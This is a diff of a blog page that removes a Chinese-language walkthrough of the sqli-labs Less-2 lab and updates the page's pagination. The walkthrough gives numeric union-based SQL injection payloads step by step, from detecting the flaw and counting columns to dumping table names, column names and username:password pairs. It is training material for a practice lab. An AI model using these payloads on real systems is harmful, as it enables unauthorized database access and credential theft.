-<td>sqli-labs</td>
-<td>Less-2</td>
-</tr>
-</tbody></table>
-<p><strong>01 判断有无注入点</strong></p>
-<ul>
-<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;1</span> → 页面正常返回值</p>
-</li>
-<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;2</span> → 无返回值</p>
-</li>
-</ul>
-<blockquote>
-<p>通过以上Payload判断存在注入点,且为<strong>数字型</strong></p>
-</blockquote>
-<p><strong>02 猜解列数</strong></p>
-<ul>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 1</span> → 正常</li>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 2</span> → 正常</li>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 3</span> → 正常</li>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 4</span> → 报错 <span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">Unknown column ‘4’ in ‘order clause’</span></li>
-</ul>
-<blockquote>
-<p>通过以上Payload可知,当前查询涉及的表共有 <strong>3 列</strong></p>
-</blockquote>
-<p><strong>03 定位回显</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/huixian.png"></p>
-<blockquote>
-<p>通过上图得知可用回显位为2,3</p>
-</blockquote>
-<p><strong>04 爆数据库名</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/database.png"></p>
-<p><strong>05 爆所有表</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span></span><br><span class="line">table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/tables.png"></p>
-<p><strong>06 爆字段</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/columns.png"></p>
-<p><strong>07 爆数据</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,<span class="string">&#x27;:&#x27;</span>,password),<span class="keyword">null</span> <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/data.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
